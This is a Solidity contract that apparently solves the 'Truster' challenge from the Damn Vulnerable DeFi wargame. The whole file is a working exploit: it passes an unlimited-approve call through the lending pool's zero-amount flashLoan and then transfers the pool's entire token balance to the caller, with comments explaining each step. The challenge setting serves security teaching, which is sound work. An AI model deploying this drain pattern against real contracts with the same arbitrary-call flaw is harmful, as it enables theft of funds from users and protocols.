// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

contract TrusterAttacker {
    TrusterLenderPool truster;
    IERC20 public immutable damnValuableToken; //IERC20 imported through pool contract

    constructor(address _truster, address tokenAddress) {
        truster = TrusterLenderPool(_truster);
        damnValuableToken = IERC20(tokenAddress);
    }

    function attack() external {
        // 1. craft the data to pass as argument in flashLoan()
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            uint256(2**256 - 1)
        );
        // this will approve our attacker contract to spend 2**256-1 = infinite amount of tokens

        // 2. take a flash Loan
        truster.flashLoan(0, msg.sender, address(damnValuableToken), data);

        // 3. Since we are approved, transfer entire pool balance to our wallet
        damnValuableToken.transferFrom(
            address(truster),
            msg.sender,
            damnValuableToken.balanceOf(address(truster))
        );
    }
}
